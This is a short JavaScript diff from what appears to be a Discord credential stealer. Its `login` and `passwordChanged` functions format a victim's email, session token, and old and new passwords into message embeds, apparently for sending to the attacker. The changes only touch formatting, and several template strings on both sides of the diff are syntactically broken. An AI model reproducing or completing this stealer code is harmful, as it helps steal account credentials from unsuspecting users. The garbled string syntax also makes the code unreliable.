@@ -336,7 +336,7 @@ const login = async (email, password, token) => {
                     },
                     {
                         name: "🔑",
-                        value: `\Token » ||`${token}\`|``,
+                        value: `\nToken » `${token}`.`,
                         inline: false,
                     },
                 ],
@@ -369,7 +369,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     {
                         name: "**Password Changed**",
                         value: `EMail » **${json.email}**\n🔻 Password » **${oldpassword}**\n🔺 Password » **${newpassword}**`,
-                        inline: true, have
+                        inline: true,
                     },
                     {
                         name: "💳",
